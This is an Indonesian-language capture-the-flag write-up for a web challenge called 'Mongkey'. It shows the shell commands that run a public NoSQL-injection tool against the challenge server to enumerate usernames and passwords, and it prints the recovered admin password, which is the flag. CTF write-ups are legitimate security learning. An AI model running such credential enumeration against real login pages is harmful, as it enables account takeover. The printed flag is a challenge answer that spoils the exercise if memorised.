# Mongkey
## About The Challenge

![image](https://github.com/qodrizizi/CTF_WRITEUP/assets/111678241/f1e9c856-7778-470f-90a4-409e514e0e54)

Diberikan sebuah website http://103.167.136.89:10002/ dengan tampilan :
![image](https://github.com/qodrizizi/CTF_WRITEUP/assets/111678241/638daf3e-7f04-4575-bc70-15c3f4ad148d)

# Solutions

Dalam challenge kita diharuskan login sebagai admin untuk mendapati flagnya
Dalam challenge juga saya mendapati petunjuk yaitu "Do you know if it is possible to post an array in PHP? I use MongoDB btw"
saya berpikir bahwa ini merupakan sejenis SQL Injection namun dalam bentu mongodb saya berpikir menggunakan tool NosQLI MongoDB injection
menggunakan tool yang saya dapatkan dari [sini](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/tree/master)
setelah mendapatkan file toolnya menggunakan git clone

saya memasukkan perintah, untuk mencari username yang terdapat didalam website :
```shell
python3 nosqli-user-pass-enum.py -u http://103.167.136.89:10002/ -up username -pp password -ep username -op login:login
```
saya mendapati bahwa username didalam website ini ada dua yaitu :
```shell
2 username(s) found:
admin
guest
```
![Cuplikan layar dari 2023-06-15 15-55-27](https://github.com/qodrizizi/CTF_WRITEUP/assets/111678241/d3f78ce3-ee61-4b4b-ba13-02211ce348e2)


guest bukanlah username untuk medapatkan flagnya maka saya berasumsi bahwa flag terdapat pada user 'admin', mari kita cari passwordnya dengan perintah :
```shell
python3 nosqli-user-pass-enum.py -u http://103.167.136.89:10002/ -up username -pp password -ep password -op login:login
```
setelah tool selesai melakukan tugasnya maka mendapati hasil
```shell
2 password(s) found:
guest
ForestyHC{reject_humanity_return_to_monke_5543d8}
```
![Cuplikan layar dari 2023-06-15 15-55-48](https://github.com/qodrizizi/CTF_WRITEUP/assets/111678241/34b96e5d-e600-4554-b2c3-46f38fc68b9a)


wow ternyata password untuk user admin adalah flag yang kita cari cari

## Flag
**ForestyHC{reject_humanity_return_to_monke_5543d8}**
